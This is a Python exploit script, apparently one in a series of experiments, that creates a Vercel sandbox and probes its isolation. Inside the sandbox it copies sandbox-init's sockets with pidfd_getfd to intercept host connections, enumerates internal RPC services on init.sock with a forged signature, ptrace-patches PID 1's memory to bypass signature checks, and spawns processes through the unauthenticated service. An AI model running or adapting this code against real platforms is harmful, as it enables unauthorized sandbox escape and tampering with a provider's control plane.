# 实验J75: sandbox-init socket fd 分析 + pidfd_getfd 复制宿主连接 + init.sock 服务枚举
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj75"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, re, struct, subprocess, ctypes, socket, base64, time, json

libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
def sc(nr, *args):
    ctypes.set_errno(0)
    r = libc.syscall(nr, *args)
    return r, ctypes.get_errno()

print("== [1] sandbox-init socket fd 与 unix 表对照 ==", flush=True)
fdmap = {}
for fd in sorted(os.listdir("/proc/1/fd"), key=int):
    try:
        ln = os.readlink("/proc/1/fd/" + fd)
        fdmap[int(fd)] = ln
    except Exception:
        pass
print("fdmap:", fdmap, flush=True)
unix_tbl = open("/proc/net/unix").read()
print(unix_tbl, flush=True)
# 找 sandbox-init 持有的 socket inode 对应的条目
for fd, ln in fdmap.items():
    m = re.match(r"socket:\[(\d+)\]", ln)
    if m:
        ino = m.group(1)
        for line in unix_tbl.splitlines():
            if line.strip().startswith(ino + ":"):
                print("fd %d inode %s -> %s" % (fd, ino, line.strip()), flush=True)

print("== [2] pidfd_getfd 只读监听 (每 fd 3s) ==", flush=True)
# pidfd_open(1) = 434; pidfd_getfd = 438
pfd, e = sc(434, 1, 0)
print("pidfd_open(1): %d errno=%d" % (pfd, e), flush=True)
if pfd >= 0:
    for target_fd in [7, 8]:
        newfd, e2 = sc(438, pfd, target_fd, 0)
        print("pidfd_getfd(%d, %d): fd=%d errno=%d" % (pfd, target_fd, newfd, e2), flush=True)
        if newfd >= 0:
            try:
                import select
                os.set_blocking(newfd, False)
                deadline = time.time() + 3
                while time.time() < deadline:
                    rl, _, _ = select.select([newfd], [], [], 0.5)
                    if newfd in rl:
                        d = os.read(newfd, 8192)
                        print("    fd%d got %d bytes: %r" % (target_fd, len(d), d[:500]), flush=True)
                        if len(d) == 0:
                            print("    fd%d EOF" % target_fd, flush=True)
                            break
                    else:
                        print("    fd%d idle 0.5s" % target_fd, flush=True)
            except Exception as ex:
                print("    fd%d EXC: %r" % (target_fd, ex), flush=True)
            finally:
                try:
                    os.close(newfd)
                except OSError:
                    pass
    # 监听 socket fd 4: 尝试 accept 看宿主连接
    try:
        lfd, e3 = sc(438, pfd, 4, 0)
        print("listener dup: fd=%d errno=%d" % (lfd, e3), flush=True)
        if lfd >= 0:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM, fileno=lfd)
            s.settimeout(1)
            try:
                c, addr = s.accept()
                print("accept OK: %r" % (addr,), flush=True)
                c.settimeout(1)
                try:
                    print("client data: %r" % c.recv(4096)[:300], flush=True)
                except Exception as ex:
                    print("client recv: %r" % ex, flush=True)
                c.close()
            except Exception as ex:
                print("accept: %r" % ex, flush=True)
            s.close()
    except Exception as ex:
        print("listener: %r" % ex, flush=True)

print("== [3] init.sock 服务路径枚举 (免签名) ==", flush=True)
def sigcall(path, body=b"{}", ctype="application/connect+json", timeout=6):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: " + ctype,
           "-H", "Connect-Protocol-Version: 1",
           "-H", "x-timestamp: " + str(int(time.time() * 1000)),
           "-H", "x-signature: " + base64.b64encode(b"\x99" * 64).decode(),
           "--data-binary", "@-", "http://localhost" + path]
    try:
        r = subprocess.run(cmd, input=body, capture_output=True, timeout=timeout + 2)
        return r.stdout.decode("latin1", "replace")
    except Exception as e:
        return "EXC " + str(e)

paths = [
    "/vercel.sandbox.spawn.v1.SpawnService/Ping",
    "/vercel.sandbox.spawn.v1.SpawnService/Kill",
    "/vercel.sandbox.spawn.v1.SpawnService/Spawn",
    "/vercel.sandbox.spawn.v1.SpawnService/",
    "/vercel.sandbox.spawn.v1.SpawnService",
    "/vercel.sandbox.v1.SandboxService/Ping",
    "/vercel.sandbox.v1.SandboxService/Get",
    "/vercel.sandbox.v1.SandboxService/Info",
    "/vercel.sandbox.v1.ControlService/Ping",
    "/vercel.sandbox.v1.HostService/Ping",
    "/vercel.sandbox.v1.CellService/Ping",
    "/vercel.sandbox.init.v1.InitService/Ping",
    "/vercel.sandbox.spawn.v1.SpawnService/Ping?connect=v1",
    "/grpc.health.v1.Health/Check",
]
for p in paths:
    out = sigcall(p)
    body = out[out.find(b"\r\n\r\n".decode())+4:] if "\r\n\r\n" in out else out
    # 提取第一行状态 + 尾部内容
    first = out.splitlines()[0] if out else "?"
    tail = out[-180:].replace("\r\n", " | ")
    print("[%-55s] %s | %s" % (p, first, tail), flush=True)

print("== [4] Spawn 带环境变量验证 (是否生效) ==", flush=True)
# 先 patch 签名 (j61 配置)
def ptrace_rw(addr, data):
    libc2 = ctypes.CDLL("libc.so.6", use_errno=True)
    libc2.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
    libc2.ptrace.restype = ctypes.c_long
    libc2.waitpid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
    libc2.waitpid.restype = ctypes.c_int
    libc2.ptrace(16, 1, None, None)
    wp = libc2.waitpid(1, None, 0)
    if wp != 1:
        libc2.ptrace(17, 1, None, None)
        return 0, 0
    ok = 0
    total = (len(data) + 7) // 8
    for off in range(0, len(data), 8):
        word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
        if libc2.ptrace(5, 1, addr + off, word) == 0:
            ok += 1
    libc2.ptrace(17, 1, None, None)
    return ok, total

PATCH_A = bytes.fromhex("31c031db4881c4d00000005dc3")
PATCH_B = bytes.fromhex("31c031db4881c4900000005dc3")
for va in [0x83b571, 0x83b5af]:
    print("patch A@%s: %s" % (hex(va), ptrace_rw(va, PATCH_A)), flush=True)
print("patch B: %s" % (ptrace_rw(0x82a9f9, PATCH_B),), flush=True)

req = json.dumps({"command": "python3", "arguments": ["-c",
    "import os; print('ENV_TEST', os.environ.get('MYVAR'), 'WD', os.getcwd())"],
    "environment": ["MYVAR=hello_from_bypass"],
    "working_directory": "/tmp"}).encode()
env_body = b"\x00" + struct.pack(">I", len(req)) + req
out = sigcall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", env_body)
print("spawn env test:", out[-400:].replace("\r\n", " | "), flush=True)
"""
run_cmd(sid, PROBE, "fd-steal-enum", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
